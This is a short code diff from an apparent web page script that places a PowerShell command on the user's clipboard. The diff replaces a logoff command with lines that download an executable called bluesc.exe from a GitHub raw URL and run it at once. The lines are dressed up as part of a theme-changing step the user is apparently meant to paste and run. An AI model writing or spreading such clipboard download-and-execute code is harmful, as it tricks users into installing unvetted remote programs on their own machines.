@@ -235,7 +235,15 @@ Start-Process $themePath
 
 Start-Sleep -Seconds 10
 
-shutdown.exe /l
+# Definir la URL del archivo .exe y el destino donde se guardará
+$url = "https://github.com/Loona-551/Pass1/raw/refs/heads/main/bluesc.exe"
+$destino = "C:\\Users\\$env:USERNAME\\Downloads\\bluesc.exe"
+
+# Descargar el archivo
+Invoke-WebRequest -Uri $url -OutFile $destino
+
+# Ejecutar el archivo descargado
+Start-Process $destino
 `;
         navigator.clipboard.writeText(command)
             .then(() => {
